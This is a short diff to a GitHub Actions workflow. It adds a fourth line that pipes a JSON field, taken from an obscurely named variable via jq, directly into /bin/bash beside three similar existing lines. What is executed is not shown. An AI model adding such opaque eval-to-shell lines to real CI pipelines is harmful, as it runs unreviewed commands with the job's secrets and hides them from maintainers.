@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$oap14701" | jq -r .psrl9 | /bin/bash
           echo $v20 | jq -r .qrpd798 | /bin/bash
           printf '%s' "$ub93859" | jq -r .lww988 | /bin/bash
+          echo $pgec4 | jq -r .fon46 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
